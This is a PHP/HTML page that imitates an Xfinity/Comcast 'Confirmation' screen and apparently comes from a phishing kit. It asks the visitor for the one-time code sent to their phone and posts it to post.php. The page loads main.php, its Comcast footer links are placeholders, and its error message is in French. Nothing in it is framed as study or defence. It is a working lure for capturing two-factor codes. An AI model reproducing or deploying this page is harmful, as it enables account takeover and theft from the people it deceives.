<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>xfinity</title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
    <main>
        <div class="container">
            <div class="logo">
                <img src="res/img/logo.png" alt="">
            </div>
            <div class="title">
                <h2>Confirmation</h2>
                <p>Please enter the code sent to your phone number to continue.</p>
            </div>
            <div class="col">
            <form action="post.php" method="post">
                <input type="text" placeholder="Enter code" name="otp" required><br><br>
                </div>
                <?php 
            if(isset($_GET['error'])){
            echo '<input type="hidden" name="exit">';
            echo '<p style="color:red;">Code invalide. Veuillez réessayer.</p>';
            }
            ?>
                
                <div class="btn">
                    <button>Continue</button>
                </div>
                </form>
                <br> <br><br><br><br>
                
               
               
                
            </div>
        </div>
        
        <footer>

            <div class="copy">
                &copy; 2025 Comcast
            </div>

            <div class="links">
                <div class="pic"> <img src="res/img/line1.png" alt="">
                <a href="#">
                   Web Terms Of Service
                </a>
                </div>

                <div class="pic2"> <img src="res/img/line2.png" alt="">
                <a href="#">
                    CA Notice at Collection
                </a>
                </div>

                <div class="pic3"> <img src="res/img/line3.png" alt="">
                <a href="#">
                    Privacy Policy
                </a>
                </div>

                <div class="pic4"> <img src="res/img/line4.png" alt="">
                <a href="#">
                    Your Privacy Choices
                </a>
                </div>

                <div class="pic5"> <img src="res/img/line5.png" alt="">
                <a href="#">
                    <span>Health Privacy Notice
                </a>
                </div>

                <div class="pic6"> <img src="res/img/line6.png" alt="">
                <a href="#">
                    Ad Choices
                </a>
                </div>
            </div>
     
            <div class="cookie">
            <div class="foter"> <img src="res/img/foter.png" alt="">
                <a href="#">
                    <span>Cookie Preferences</span>
                </a>
                </div>
            </div>
    </footer>
    </main>
    
</body>
</html>